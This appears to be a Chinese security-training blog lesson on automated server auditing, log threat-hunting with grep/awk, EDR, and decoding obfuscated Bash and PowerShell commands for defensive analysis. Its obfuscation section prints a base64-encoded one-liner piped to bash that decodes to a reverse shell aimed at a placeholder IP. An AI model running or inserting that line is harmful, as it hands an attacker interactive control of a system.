---
title: Day021：操作系统与脚本 - 脚本分析与自动化安全检查
tags:
  - 网络
  - 安全
  - 学习计划
categories:
  - 网络安全
abbrlink: b93a4
date: 2026-02-12
updated: 2026-02-12
---

# Day021：操作系统与脚本 - 脚本分析与自动化安全检查

- **日期**：2026-02-12
- **周次**：第 3 周
- **模块**：操作系统与脚本
- **主题**：脚本分析与自动化安全检查
- **预计学习时间**：3 小时

---

## 🎯 学习目标

学完今天你应该能做到：

- **自动化巡检**：写一个脚本，一键检查服务器是否安全（账号、端口、进程）。
- **威胁狩猎**：在海量日志中，快速定位到黑客的攻击 IP。
- **解密恶意代码**：看懂黑客混淆过的 Bash 或 PowerShell 脚本。

<!--more-->

## 📚 完整学习内容（必读）

### 一、概念理解：防御者的“自动化”

攻击者都在用自动化工具扫描你，你如果还用肉眼看日志，那必输无疑。
我们要做的两件事：
1.  **主动巡检**：在黑客进来之前，发现系统的弱点（弱口令、未打补丁）。
2.  **日志分析**：在黑客进来之后，快速发现他的踪迹。

### 二、原理讲解：恶意脚本混淆

黑客为了不被杀毒软件发现，会把脚本变得“连亲妈都不认识”。

#### 1. Bash 混淆
黑客代码：
`echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84MDgwIDA+JjEK" | base64 -d | bash`
**解析**：
这一看就是 Base64。把中间那串乱码拿去解码，你会发现它就是 `bash -i ...` 反弹 Shell。

#### 2. PowerShell 混淆
黑客代码：
`PowErShElL -eNc ZQBjAGgAbwAgACIASABhAGMAawBlAGQAIgA=`
**解析**：
- 大小写混用（PowerShell 不敏感）。
- `-eNc` 是 `-EncodedCommand` 的缩写。
- 后面是 Base64 编码的 Unicode 字符串。

### 三、技术细节：实战分析套路

#### 1. 自动化巡检脚本 (Linux 版)
把我们 Day 15 学的命令串起来：

```bash
#!/bin/bash
echo "[1] 检查特权用户:"
awk -F: '$3==0 {print $1}' /etc/passwd

echo "[2] 检查对外开放端口:"
netstat -antp | grep LISTEN

echo "[3] 检查最近登录失败的 IP (Top 5):"
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -5
```

#### 2. 日志威胁狩猎 (使用 grep + 正则)
场景：Apache 网站日志 `access.log`。
**任务**：找出 SQL 注入攻击。
**命令**：
`grep -iE "union.*select|select.*from" access.log`
（`-i` 忽略大小写，`-E` 开启扩展正则）

### 四、进阶知识：EDR (端点检测与响应)

企业里通常不手写脚本，而是安装 EDR 软件（像 360 企业版，但更高级）。
EDR 会实时监控所有进程的行为：
- 如果一个 Word 文档打开后，突然启动了 PowerShell 还要联网下载 `.exe`，EDR 会直接杀掉进程并报警。
这就叫**基于行为的检测**。

### 五、本日知识点速查表

| 序号 | 核心概念 | 关键点 | 备注 |
|------|----------|--------|------|
| 1 | **Base64** | `echo ... | base64 -d` | 最常见的解密方法 |
| 2 | **Top N** | `sort | uniq -c | sort -nr` | 统计频率最高的项 |
| 3 | **Awk** | `{print $1}` | 提取日志中的某一列 |
| 4 | **混淆** | Obfuscation | 也就是把代码写得乱七八糟 |
| 5 | **IoC** | 入侵指标 | IP、哈希值、恶意域名等 |

---

## 🔧 实践任务（合法授权范围内）

### 任务 1：编写巡检小工具

**操作步骤**：
1. 在虚拟机里创建一个脚本 `audit.sh`。
2. 写入上面的“自动化巡检脚本”代码。
3. 运行它，看看你的虚拟机有没有高危风险（比如 root 是否能远程登录？）。

### 任务 2：侦探游戏（解码恶意样本）

假设你抓到了黑客留下的一行代码：
`echo "cGluZyAtYyA0IDEyNy4wLjAuMQ==" | base64 -d | sh`

**操作步骤**：
1. 不要直接运行！
2. 只运行管道符前面的部分：`echo "cGluZyAtYyA0IDEyNy4wLjAuMQ==" | base64 -d`
3. 看看它原本想干什么？（答案是 ping 127.0.0.1）

### 任务 3：日志分析实战

**操作步骤**：
1. 查看 `/var/log/auth.log`（如果你没权限，就用 `sudo`）。
2. 统计一下今天谁登录成功的次数最多？
   `grep "Accepted" /var/log/auth.log | awk '{print $9}' | sort | uniq -c`
   *(注：不同系统日志格式可能不同，$9 可能是用户名所在列，请根据实际情况调整)*

---

## 📝 巩固练习

### 练习 1：概念理解
**问**：为什么黑客喜欢用 Base64 编码命令？
**答**：为了绕过简单的关键词检测（WAF/IDS）。如果系统只拦截 "bash"，那黑客把它变成 "YmFzaA==" 就拦截不到了。但现在的安全设备通常都能自动解码。

### 练习 2：实操复盘
**问**：我发现了一个挖矿进程，杀掉后马上又重启了，怎么办？
**答**：说明它有守护进程或定时任务 (Crontab)。
1. 检查 `crontab -l`。
2. 检查 `systemctl` 服务。
3. 检查 `/etc/rc.local` 启动项。
必须把根源删掉，才能彻底清除。

---

## ✅ 学习成果自检

- [ ] 我能写出一个简单的 Shell 脚本来统计日志。
- [ ] 我知道怎么解密 Base64 字符串。
- [ ] 我能看懂 `sort | uniq -c | sort -nr` 这套组合拳的含义。

---

> 💬 **老师寄语**：
> 恭喜你完成了第三周的学习！
> 这一周我们深入了操作系统的心脏：
> - 从 **Linux** 到 **Windows** 的权限管理。
> - 从 **PowerShell** 到 **Bash** 的脚本攻防。
> - 从 **Python** 工具开发到 **正则** 日志分析。
>
> 现在的你，已经具备了基本的系统运维和脚本分析能力。下周，我们将进入更刺激的领域 —— **Web 安全**（SQL 注入、XSS、上传漏洞...），那才是黑客攻防的主战场！
